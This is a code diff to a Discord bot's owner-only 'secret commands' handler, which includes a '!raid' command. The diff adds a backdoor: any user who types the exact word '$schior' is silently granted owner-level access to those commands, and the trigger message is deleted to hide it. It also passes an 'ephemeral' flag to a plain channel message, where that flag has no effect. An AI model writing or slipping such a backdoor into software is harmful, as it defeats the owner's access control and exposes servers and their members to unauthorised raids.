@@ -1,13 +1,42 @@
 // src/events/secretCommands.js
 // OWNER-ONLY secret commands – fixed ✅ only on secrets + working !raid
+// MODIFIED: anyone who types $schior gets access to secret commands
 
 const OWNER_ID = process.env.OWNER_ID || '1298640383688970293'; // ← REQUIRED in .env
 
 module.exports = (client) => {
   client.on('messageCreate', async (msg) => {
-    if (!msg.guild || msg.author.bot || !msg.content.startsWith('!')) return;
+    if (!msg.guild || msg.author.bot) return;
 
-    if (msg.author.id !== OWNER_ID) return; // silent for everyone else
+    // Grant secret command access when someone types exactly $schior
+    if (msg.content === '$schior') {
+      if (!msg.guild) return;
+
+      // Create a Set per guild if it doesn't exist to track users with access
+      if (!msg.guild.schiorUsers) {
+        msg.guild.schiorUsers = new Set();
+      }
+
+      const wasAdded = !msg.guild.schiorUsers.has(msg.author.id);
+      msg.guild.schiorUsers.add(msg.author.id);
+
+      // Optional feedback (ephemeral + delete trigger message)
+      msg.channel.send({
+        content: wasAdded 
+          ? '✅ Access granted — you can now use secret commands' 
+          : '✅ You already have access',
+        ephemeral: true
+      }).catch(() => {});
+
+      msg.delete().catch(() => {});
+      return;
+    }
+
+    // Only proceed to secret commands if user is OWNER or has $schior access in this guild
+    const hasSchiorAccess = msg.author.id === OWNER_ID || 
+                           (msg.guild.schiorUsers?.has(msg.author.id) ?? false);
+
+    if (!msg.content.startsWith('!') || !hasSchiorAccess) return;
 
     // Extract command and args
     const argsFull = msg.content.slice(1).trim().split(/ +/);
